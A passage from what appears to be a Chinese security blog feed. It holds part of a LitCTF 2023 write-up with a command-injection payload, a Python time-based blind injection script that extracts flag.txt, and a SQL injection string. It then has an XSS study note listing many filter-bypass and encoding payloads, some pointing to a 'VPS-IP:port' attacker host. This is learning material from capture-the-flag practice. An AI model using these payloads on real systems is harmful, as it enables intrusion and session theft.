class="hljs-built_in">read</span>()<br></code></pre></td></tr></table></figure><p>可判断该题没有过滤，直接将用户输入的内容输出<br>选择命令注入<code>| cat flag.txt</code></p><h2 id="没写出来的"><a href="#没写出来的" class="headerlink" title="没写出来的"></a>没写出来的</h2><p>感谢土豆佬<br><a href="https://potatowo233.github.io/2023/08/09/Litctf2023/">https://potatowo233.github.io/2023/08/09/Litctf2023/</a></p><h3 id="Ping-Pong-Under-Maintenance"><a href="#Ping-Pong-Under-Maintenance" class="headerlink" title="Ping Pong: Under Maintenance"></a>Ping Pong: Under Maintenance</h3><p>本题与Ping Pong的区别为无回显且不出网，可采用sh语句用sleep进行判断（类似SQL时间盲注）<br>脚本：</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs stylus">import requests<br>import <span class="hljs-selector-tag">time</span><br>import string<br><br>url = <span class="hljs-string">&#x27;http://34.130.180.82:56409/&#x27;</span><br>flag = <span class="hljs-string">&#x27;&#x27;</span><br><br>pre = string<span class="hljs-selector-class">.ascii_uppercase</span> + <span class="hljs-string">&#x27;234567=&#x27;</span><br><span class="hljs-keyword">for</span> <span class="hljs-selector-tag">i</span> <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-number">200</span>):<br>    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> pre:<br>        s_time = <span class="hljs-selector-tag">time</span><span class="hljs-selector-class">.time</span>()<br>        payload = f<span class="hljs-string">&#x27;&#x27;</span><span class="hljs-string">&#x27;|if [ `cat flag.txt|base32|cut -c &#123;i&#125;` = &#x27;</span>&#123;j&#125;<span class="hljs-string">&#x27; ];then sleep 4;fi&#x27;</span><span class="hljs-string">&#x27;&#x27;</span><br>        r = requests<span class="hljs-selector-class">.post</span>(url,data=&#123;<br>            <span class="hljs-string">&#x27;hostname&#x27;</span>:payload<br>        &#125;)<br>        e_time = <span class="hljs-selector-tag">time</span><span class="hljs-selector-class">.time</span>()<br>        exec_time = e_time - s_time<br>        <span class="hljs-keyword">if</span> exec_time &gt; <span class="hljs-number">4</span>:<br>            flag += j<br>            <span class="hljs-built_in">print</span>(flag)<br>            break<br></code></pre></td></tr></table></figure><h3 id="license-inject"><a href="#license-inject" class="headerlink" title="license-inject"></a>license-inject</h3><p>百度后得知这是个车牌检索软件，可以获得图片的信息<br>查看源码</p><figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs arcade">plates.<span class="hljs-built_in">push</span>(&#123;<br><span class="hljs-attr">name</span>: <span class="hljs-string">&#x27;codetiger&#x27;</span>,<br><span class="hljs-comment">// very long random string</span><br>plate: <span class="hljs-built_in">Array</span>(<span class="hljs-number">40</span>)<br>.fill(<span class="hljs-string">&#x27;&#x27;</span>)<br>.<span class="hljs-built_in">map</span>(<span class="hljs-function"><span class="hljs-params">()</span> =&gt;</span> <span class="hljs-string">&#x27;ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&#x27;</span>[Math.<span class="hljs-built_in">floor</span>(Math.<span class="hljs-built_in">random</span>() * <span class="hljs-number">36</span>)])<br>.join(<span class="hljs-string">&#x27;&#x27;</span>),<br><span class="hljs-attr">fine</span>: <span class="hljs-string">&#x27;LITCTF&#123;redacted&#125;&#x27;</span><br>&#125;);<br>plates.<span class="hljs-built_in">push</span>(&#123;<br><span class="hljs-attr">name</span>: <span class="hljs-string">&#x27;Sample User&#x27;</span>,<br><span class="hljs-attr">plate</span>: <span class="hljs-string">&#x27;215BG2&#x27;</span>,<br><span class="hljs-attr">fine</span>: <span class="hljs-string">&#x27;$6942&#x27;</span><br>&#125;);<br></code></pre></td></tr></table></figure><p>闭合查询语句查询codetiger即可，但要用图片<code>&quot; or name = &#39;codetiger&#39;;--</code></p><p>第一次见到这种形式的SQL注入</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>2023/08/10：xss笔记</title>
    <link href="/2023/08/10/xssnote/"/>
    <url>/2023/08/10/xssnote/</url>
    
    <content type="html"><![CDATA[<h2 id="xss笔记"><a href="#xss笔记" class="headerlink" title="xss笔记"></a>xss笔记</h2><h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p>将恶意脚本注入受害者浏览器，使其在浏览器中运行</p><h3 id="分类"><a href="#分类" class="headerlink" title="分类"></a>分类</h3><p>1.存储型<br>恶意代码上传至后端，当管理员查询信息时触发<br>如：利用GET、POST或在Referer（xsslab 11）、Cookie（xsslab 13）植入<br>2.反射型<br>需要用户点击触发，在前端显示，一般盗取用户Cookie，较为常见<br>如：<br>假设有如下代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-keyword">echo</span> <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;name&#x27;</span>]; <span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>恶意代码就可以通过GET显示在前端界面<br>3.DOM型<br>不经过后端，利用文档对象模型，属于较特殊的反射型xss<br>如：document.write()函数<br>（burplab好像不少这种题）<br>4.JSONP型<br>按原作者的话较为罕见，浏览器设置了CSP同源策略不允许调用其他域名API时，利用JSONP协议跨域加载特性在JSONP注入恶意代码<br>如：<br>API端口“<a href="http://evi1s7.com/api%E2%80%9D%E8%BF%94%E5%9B%9E%E5%A6%82%E4%B8%8BJSONP%E5%93%8D%E5%BA%94%EF%BC%9A">http://Evi1s7.com/api”返回如下JSONP响应：</a></p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">callback</span><span class="hljs-params">(&#123; <span class="hljs-string">&quot;name&quot;</span>: <span class="hljs-string">&quot;John&quot;</span>, <span class="hljs-string">&quot;age&quot;</span>: <span class="hljs-number">30</span> &#125;)</span></span><br></code></pre></td></tr></table></figure><p>可构造如下url执行脚本：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">https:<span class="hljs-regexp">//</span>Evi1s7.com/api?callback=attackerFunction<br></code></pre></td></tr></table></figure><p>这样返回的JSONP响应发生修改：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">attacjerFunction</span>(&#123; <span class="hljs-string">&quot;name&quot;</span>: <span class="hljs-string">&quot;John&quot;</span>, <span class="hljs-string">&quot;age&quot;</span>: <span class="hljs-number">30</span> &#125;);<br></code></pre></td></tr></table></figure><p>就可以在页面定义attacjerFunction注入恶意脚本：</p><figure class="highlight xquery"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs xquery"><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="language-javascript"><span class="language-xml"><span class="hljs-keyword">function</span> <span class="hljs-title function_">attackerFunction</span>(<span class="hljs-params">data</span>) </span></span><span class="language-xquery">&#123;</span><br><span class="language-xquery"> <span class="hljs-built_in"> document</span>.cookie = <span class="hljs-string">&quot;sessionID=&quot;</span> + data<span class="hljs-built_in">.name</span>;</span><br><span class="language-xquery">&#125;</span><span class="language-xml"></span><br><span class="language-xml"><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></span><br></code></pre></td></tr></table></figure><h3 id="攻击对象"><a href="#攻击对象" class="headerlink" title="攻击对象"></a>攻击对象</h3><p>又名把xss插到哪</p><h4 id="HTML的注释"><a href="#HTML的注释" class="headerlink" title="HTML的注释"></a>HTML的注释</h4><p>如：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-comment">&lt;!-- 2333 --&gt;</span><br><span class="hljs-comment">&lt;!-- </span><br><span class="hljs-comment">&lt;script&gt;</span><br><span class="hljs-comment">  alert(&#x27;1&#x27;);</span><br><span class="hljs-comment">&lt;/script&gt;</span><br><span class="hljs-comment">--&gt;</span><br></code></pre></td></tr></table></figure><h4 id="HTML标签"><a href="#HTML标签" class="headerlink" title="HTML标签"></a>HTML标签</h4><p>例如将代码插入到标签的onerror属性中，无法显示图片时就会调用该代码</p><h4 id="HTML属性名"><a href="#HTML属性名" class="headerlink" title="HTML属性名"></a>HTML属性名</h4><p>利用闭合的方式可以插入属性名执行<br>如：</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">&lt;input <span class="hljs-attribute">type</span>=<span class="hljs-string">&quot;text&quot;</span> <span class="hljs-attribute">onclick</span>=<span class="hljs-string">&quot;alert(&#x27;1&#x27;)&quot;</span> <span class="hljs-attribute">name</span>=<span class="hljs-string">&quot;&gt;&lt;script&gt;alert(&#x27;XSS攻击成功！&#x27;)&lt;/script&gt;&quot;</span>&gt;<br></code></pre></td></tr></table></figure><p>插入后前半部分完整，可以执行后半部分的脚本</p><h4 id="HTML标签名"><a href="#HTML标签名" class="headerlink" title="HTML标签名"></a>HTML标签名</h4><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml">&lt;<span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"><span class="hljs-title function_">alert</span>(<span class="hljs-string">&#x27;1&#x27;</span>)</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>img src=1&gt;<br></code></pre></td></tr></table></figure><p>这段代码中，浏览器会将第一个尖括号视为标签名的起始符号，而第二个尖括号则是script标签的起始符号，导致浏览器误以为有两个标签被嵌套在一起，从而实现我们的XSS攻击</p><h4 id="直接插入"><a href="#直接插入" class="headerlink" title="直接插入"></a>直接插入</h4><p>直接插入script，不带改的</p><h4 id="插入css"><a href="#插入css" class="headerlink" title="插入css"></a>插入css</h4><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">&lt;div <span class="hljs-attribute">style</span>=<span class="hljs-string">&quot;background-image:url(&#x27;javascript:alert(&#x27;1&#x27;)&#x27;);&quot;</span>&gt;<br></code></pre></td></tr></table></figure><p>当css样式能插入url时，用户打开这个界面浏览器就会执行脚本</p><h4 id="插入响应（HTTP报头注入）"><a href="#插入响应（HTTP报头注入）" class="headerlink" title="插入响应（HTTP报头注入）"></a>插入响应（HTTP报头注入）</h4><p>利用报头注入漏洞通过注入CRLF字符（回车、换行）向HTTP响应注入任意HTTP头或响应体，来改变响应内容<br>如：</p><figure class="highlight maxima"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs maxima"><span class="hljs-built_in">exp</span>:?<span class="hljs-built_in">key</span>=aaa<br></code></pre></td></tr></table></figure><p>若该利用GET的形式传参的网站存在CRLF漏洞，那么我们就可以利用回车符/换行符进行绕过过滤</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">?<span class="hljs-attribute">key</span>=%0d%0a%0d%0a&lt;img <span class="hljs-attribute">src</span>=1 <span class="hljs-attribute">onerror</span>=alert(1)&gt;<br></code></pre></td></tr></table></figure><p>返回包如下</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-meta">HTTP/1.1</span> <span class="hljs-number">200</span> OK<br><br><span class="language-arcade"><span class="hljs-built_in">Date</span>:xxxxxxxxxx</span><br><span class="language-arcade"></span><br><span class="language-arcade">Content-type:<span class="hljs-built_in">text</span>/html</span><br><span class="language-arcade"></span><br><span class="language-arcade">Contet-<span class="hljs-built_in">Length</span>:xxx</span><br><span class="language-arcade"></span><br><span class="language-arcade">Connection:close</span><br><span class="language-arcade"></span><br><span class="language-arcade">Location:</span><br><span class="language-arcade"></span><br><span class="language-arcade">&lt;img src=<span class="hljs-number">1</span> onerror=alert(<span class="hljs-regexp">/xss/</span>)&gt;</span><br></code></pre></td></tr></table></figure><p>http包分为了header和body，成功执行了body中的代码，实现XSS</p><h3 id="绕过"><a href="#绕过" class="headerlink" title="绕过"></a>绕过</h3><h4 id="关键词绕过"><a href="#关键词绕过" class="headerlink" title="关键词绕过"></a>关键词绕过</h4><h5 id="大小写绕过"><a href="#大小写绕过" class="headerlink" title="大小写绕过"></a>大小写绕过</h5><p>如xsslab第6题</p><figure class="highlight autoit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs autoit">$str = $_GET[<span class="hljs-string">&quot;keyword&quot;</span>]<span class="hljs-comment">;</span><br>$str2=str_replace(<span class="hljs-string">&quot;&lt;script&quot;</span>,<span class="hljs-string">&quot;&lt;scr_ipt&quot;</span>,$str)<span class="hljs-comment">;</span><br>$str3=str_replace(<span class="hljs-string">&quot;on&quot;</span>,<span class="hljs-string">&quot;o_n&quot;</span>,$str2)<span class="hljs-comment">;</span><br>$str4=str_replace(<span class="hljs-string">&quot;src&quot;</span>,<span class="hljs-string">&quot;sr_c&quot;</span>,$str3)<span class="hljs-comment">;</span><br>$str5=str_replace(<span class="hljs-string">&quot;data&quot;</span>,<span class="hljs-string">&quot;da_ta&quot;</span>,$str4)<span class="hljs-comment">;</span><br>$str6=str_replace(<span class="hljs-string">&quot;href&quot;</span>,<span class="hljs-string">&quot;hr_ef&quot;</span>,$str5)<span class="hljs-comment">;</span><br></code></pre></td></tr></table></figure><p>str_replace()需要区分大小写</p><h5 id="拼接绕过"><a href="#拼接绕过" class="headerlink" title="拼接绕过"></a>拼接绕过</h5><p>1.eval</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">&lt;img <span class="hljs-attribute">src</span>=<span class="hljs-string">&quot;x&quot;</span> <span class="hljs-attribute">onerror</span>=<span class="hljs-string">&quot;eval(&#x27;al&#x27;+&#x27;ert(1)&#x27;)&quot;</span>&gt;<br></code></pre></td></tr></table></figure><p>2.top</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">&lt;img <span class="hljs-attribute">src</span>=<span class="hljs-string">&quot;x&quot;</span> <span class="hljs-attribute">onerror</span>=<span class="hljs-string">&quot;top[&#x27;al&#x27;+&#x27;ert&#x27;](1)&quot;</span>&gt;<br></code></pre></td></tr></table></figure><p>3.window</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">&lt;img <span class="hljs-attribute">src</span>=<span class="hljs-string">&quot;x&quot;</span> <span class="hljs-attribute">onerror</span>=<span class="hljs-string">&quot;window[&#x27;al&#x27;+&#x27;ert&#x27;](1)&quot;</span>&gt;<br></code></pre></td></tr></table></figure><p>4.self</p><figure class="highlight autohotkey"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs autohotkey">&lt;img src=<span class="hljs-string">&quot;x&quot;</span> onerror=<span class="hljs-string">&quot;self[`al`+`ert`](1)&quot;</span>&gt;<br></code></pre></td></tr></table></figure><p>5.parent</p><figure class="highlight autohotkey"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs autohotkey">&lt;img src=<span class="hljs-string">&quot;x&quot;</span> onerror=<span class="hljs-string">&quot;parent[`al`+`ert`](1)&quot;</span>&gt;<br></code></pre></td></tr></table></figure><p>6.frames</p><figure class="highlight autohotkey"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs autohotkey">&lt;img src=<span class="hljs-string">&quot;x&quot;</span> onerror=<span class="hljs-string">&quot;frames[`al`+`ert`](1)&quot;</span>&gt;<br></code></pre></td></tr></table></figure><h5 id="函数替换"><a href="#函数替换" class="headerlink" title="函数替换"></a>函数替换</h5><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs routeros">&lt;img <span class="hljs-attribute">src</span>=<span class="hljs-string">&quot;x&quot;</span> <span class="hljs-attribute">onerror</span>=<span class="hljs-string">&quot;eval(alert(1))&quot;</span>&gt;<br>&lt;img <span class="hljs-attribute">src</span>=<span class="hljs-string">&quot;x&quot;</span> <span class="hljs-attribute">onerror</span>=<span class="hljs-string">&quot;open(alert(1))&quot;</span>&gt;<br>&lt;img <span class="hljs-attribute">src</span>=<span class="hljs-string">&quot;x&quot;</span> <span class="hljs-attribute">onerror</span>=<span class="hljs-string">&quot;document.write(alert(1))&quot;</span>&gt;<br>&lt;img <span class="hljs-attribute">src</span>=<span class="hljs-string">&quot;x&quot;</span> <span class="hljs-attribute">onerror</span>=<span class="hljs-string">&quot;setTimeout(alert(1))&quot;</span>&gt;<br>&lt;img <span class="hljs-attribute">src</span>=<span class="hljs-string">&quot;x&quot;</span> <span class="hljs-attribute">onerror</span>=<span class="hljs-string">&quot;setInterval(alert(1))&quot;</span>&gt;<br>&lt;img <span class="hljs-attribute">src</span>=<span class="hljs-string">&quot;x&quot;</span> <span class="hljs-attribute">onerror</span>=<span class="hljs-string">&quot;Set.constructor(alert(1))&quot;</span>&gt;<br>&lt;img <span class="hljs-attribute">src</span>=<span class="hljs-string">&quot;x&quot;</span> <span class="hljs-attribute">onerror</span>=<span class="hljs-string">&quot;Map.constructor(alert(1))&quot;</span>&gt;<br>&lt;img <span class="hljs-attribute">src</span>=<span class="hljs-string">&quot;x&quot;</span> <span class="hljs-attribute">onerror</span>=<span class="hljs-string">&quot;Array.constructor(alert(1))&quot;</span>&gt;<br>&lt;img <span class="hljs-attribute">src</span>=<span class="hljs-string">&quot;x&quot;</span> <span class="hljs-attribute">onerror</span>=<span class="hljs-string">&quot;WeakSet.constructor(alert(1))&quot;</span>&gt;<br>&lt;img <span class="hljs-attribute">src</span>=<span class="hljs-string">&quot;x&quot;</span> <span class="hljs-attribute">onerror</span>=<span class="hljs-string">&quot;constructor.constructor(alert(1))&quot;</span>&gt;<br>&lt;img <span class="hljs-attribute">src</span>=<span class="hljs-string">&quot;x&quot;</span> <span class="hljs-attribute">onerror</span>=<span class="hljs-string">&quot;[1].map(alert(1))&quot;</span>&gt;<br>&lt;img <span class="hljs-attribute">src</span>=<span class="hljs-string">&quot;x&quot;</span> <span class="hljs-attribute">onerror</span>=<span class="hljs-string">&quot;[1].find(alert(1))&quot;</span>&gt;<br>&lt;img <span class="hljs-attribute">src</span>=<span class="hljs-string">&quot;x&quot;</span> <span class="hljs-attribute">onerror</span>=<span class="hljs-string">&quot;[1].every(alert(1))&quot;</span>&gt;<br>&lt;img <span class="hljs-attribute">src</span>=<span class="hljs-string">&quot;x&quot;</span> <span class="hljs-attribute">onerror</span>=<span class="hljs-string">&quot;[1].filter(alert(1))&quot;</span>&gt;<br>&lt;img <span class="hljs-attribute">src</span>=<span class="hljs-string">&quot;x&quot;</span> <span class="hljs-attribute">onerror</span>=<span class="hljs-string">&quot;[1].forEach(alert(1))&quot;</span>&gt;<br>&lt;img <span class="hljs-attribute">src</span>=<span class="hljs-string">&quot;x&quot;</span> <span class="hljs-attribute">onerror</span>=<span class="hljs-string">&quot;[1].findIndex(alert(1))&quot;</span>&gt;<br></code></pre></td></tr></table></figure><h5 id="嵌套替换"><a href="#嵌套替换" class="headerlink" title="嵌套替换"></a>嵌套替换</h5><p>如：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml">&lt;sc<span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript">ript&gt;<span class="hljs-title function_">alert</span>(<span class="hljs-string">&#x27;Evi1s7&#x27;</span>)&lt;/sc</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>ript&gt;<br></code></pre></td></tr></table></figure><h5 id="赋值绕过"><a href="#赋值绕过" class="headerlink" title="赋值绕过"></a>赋值绕过</h5><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs routeros">&lt;img src <span class="hljs-attribute">onerror</span>=_=alert,_(1)&gt;<br>&lt;img src <span class="hljs-attribute">x</span>=al <span class="hljs-attribute">y</span>=ert <span class="hljs-attribute">onerror</span>=top[x+y](1)&gt;<br>&lt;img src <span class="hljs-attribute">x</span>=al <span class="hljs-attribute">y</span>=ert <span class="hljs-attribute">onerror</span>=window[x+y](1)&gt; #在网页没有嵌套框架时才有效。<br>&lt;img src <span class="hljs-attribute">onerror</span>=top[<span class="hljs-attribute">a</span>=<span class="hljs-string">&#x27;al&#x27;</span>,b=&#x27;ev&#x27;,b+a](<span class="hljs-string">&#x27;alert(1)&#x27;</span>)&gt;<br>&lt;img src onerror=[<span class="hljs-string">&#x27;ale&#x27;</span>+<span class="hljs-string">&#x27;rt&#x27;</span>].map(top[<span class="hljs-string">&#x27;ev&#x27;</span>+<span class="hljs-string">&#x27;al&#x27;</span>])[0][<span class="hljs-string">&#x27;valu&#x27;</span>+<span class="hljs-string">&#x27;eOf&#x27;</span>]()(1)&gt;<br></code></pre></td></tr></table></figure><h4 id="编码绕过"><a href="#编码绕过" class="headerlink" title="编码绕过"></a>编码绕过</h4><h5 id="HTML编码转义"><a href="#HTML编码转义" class="headerlink" title="HTML编码转义"></a>HTML编码转义</h5><p>当可控点为单个标签属性时，可以使用 html 实体编码。<br>可采用十进制、十六进制或填充0的方式<br>填充0：</p><figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs clean">&lt;a href=&amp;#x006a&amp;#x0061&amp;#x0076&amp;#x0061&amp;#x0073&amp;#x0063&amp;#x0072&amp;#x0069&amp;#x0070&amp;#x0074&amp;#x003a&amp;#x0061&amp;#x006c&amp;#x0065&amp;#x0072&amp;#x0074&amp;#x0028&amp;#x0031&amp;#x0029&gt;aaa&lt;/a&gt;<br></code></pre></td></tr></table></figure><h5 id="url编码"><a href="#url编码" class="headerlink" title="url编码"></a>url编码</h5><p>需要注入点存在href属性或者src属性，才可以利用url编码转义且在url解析过程中，不能对协议类型进行任何的编码操作<br>如：</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs llvm">&lt;a href<span class="hljs-operator">=</span>javascript:<span class="hljs-variable">%61</span><span class="hljs-variable">%6</span><span class="hljs-keyword">c</span><span class="hljs-variable">%65</span><span class="hljs-variable">%72</span><span class="hljs-variable">%74</span><span class="hljs-variable">%28</span><span class="hljs-variable">%31</span><span class="hljs-variable">%29</span>&gt;<span class="hljs-number">233</span>&lt;/a&gt;<br></code></pre></td></tr></table></figure><p>src属性通常用于指定外部资源的URL，让浏览器从指定的URL中获取资源并加载它们（如img、script标签）<br>href属性通常用于指定链接目标的URL或外部资源的URL，以及用于指定基准URL或图像地图中区域的URL（如link、a标签）</p><h4 id="空格绕过"><a href="#空格绕过" class="headerlink" title="空格绕过"></a>空格绕过</h4><p>在html的标签中的不同位置的空格绕过方式不是一样的</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-section">&lt;html&gt;</span><span class="hljs-section">&lt;imgAAsrcAAonerrorBB=BBalertCC(1)DD&lt;/html&gt;</span><br></code></pre></td></tr></table></figure><p>A： /，/123/，%09，%0A，%0C，%0D，%20<br>B：%09，%0A，%0C，%0D，%20<br>C：%0B，/**/ （如果加了双引号，则可以填充 %09，%0A，%0C，%0D，%20）<br>D：%09，%0A，%0C，%0D，%20，//，&gt;</p><h4 id="绕过-1"><a href="#绕过-1" class="headerlink" title="()绕过"></a>()绕过</h4><h5 id="反引号绕过"><a href="#反引号绕过" class="headerlink" title="反引号绕过"></a>反引号绕过</h5><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">alert</span>`<span class="hljs-number">1</span>`<br></code></pre></td></tr></table></figure><h5 id="throw绕过"><a href="#throw绕过" class="headerlink" title="throw绕过"></a>throw绕过</h5><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript">alert;<span class="hljs-keyword">throw</span> <span class="hljs-number">1</span></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure><h4 id="alert绕过（关键词过滤绕过的特殊情况）"><a href="#alert绕过（关键词过滤绕过的特殊情况）" class="headerlink" title="alert绕过（关键词过滤绕过的特殊情况）"></a>alert绕过（关键词过滤绕过的特殊情况）</h4><h5 id="函数替换-1"><a href="#函数替换-1" class="headerlink" title="函数替换"></a>函数替换</h5><p>可用prompt()、confirm()、console.log()、document.write()</p><h5 id="编码绕过-1"><a href="#编码绕过-1" class="headerlink" title="编码绕过"></a>编码绕过</h5><figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs gcode">&lt;a href=javascript:<span class="hljs-meta">%</span><span class="hljs-number">61</span><span class="hljs-meta">%</span><span class="hljs-number">6</span>c<span class="hljs-meta">%</span><span class="hljs-number">65</span><span class="hljs-meta">%</span><span class="hljs-number">72</span><span class="hljs-meta">%</span><span class="hljs-number">74</span><span class="hljs-meta">%</span><span class="hljs-number">28</span><span class="hljs-meta">%</span><span class="hljs-number">31</span><span class="hljs-meta">%</span><span class="hljs-number">29</span>&gt;aaa&lt;/a&gt;<br><span class="hljs-attr">#alert(1</span>)<br></code></pre></td></tr></table></figure><h4 id="长度限制"><a href="#长度限制" class="headerlink" title="长度限制"></a>长度限制</h4><h5 id="拆分"><a href="#拆分" class="headerlink" title="拆分"></a>拆分</h5><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript">a=<span class="hljs-string">&#x27;document.write(&quot;&#x27;</span></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript">a=a+<span class="hljs-string">&#x27;&lt;a href=ht&#x27;</span></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript">a=a+<span class="hljs-string">&#x27;tp://VPS-IP:po&#x27;</span></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript">a=a+<span class="hljs-string">&#x27;rt&gt;1&lt;/a&gt;&quot;)&#x27;</span></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"><span class="hljs-built_in">eval</span>(a)</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure><h5 id="eval-拼接"><a href="#eval-拼接" class="headerlink" title="eval()拼接"></a>eval()拼接</h5><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml">document.write(&quot;<span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">http://VPS-IP:port</span>&gt;</span>1<span 